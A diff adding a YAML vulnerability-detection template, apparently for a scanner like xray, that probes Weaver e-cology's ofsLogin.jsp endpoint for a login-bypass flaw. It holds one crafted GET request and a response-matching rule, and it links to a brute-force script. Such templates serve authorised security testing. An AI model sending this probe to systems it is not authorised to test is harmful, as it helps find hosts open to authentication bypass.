@@ -1,0 +1,17 @@
+name: poc-yaml-ecology-ofslogin-everyonelogin
+manual: true
+transport: http
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird=
+    expression: response.status == 200 && response.body.bcontains(b'/login/Login.jsp') && response.body.bcontains(b'location.replace')
+expression: r0()
+detail:
+  author: klear
+  links:
+    - https://github.com/A0WaQ4/Weaver_ofslogin_vul/blob/main/ecology_ofsLogin_brute.py
+    - https://stack.chaitin.com/techblog/detail?id=90
+
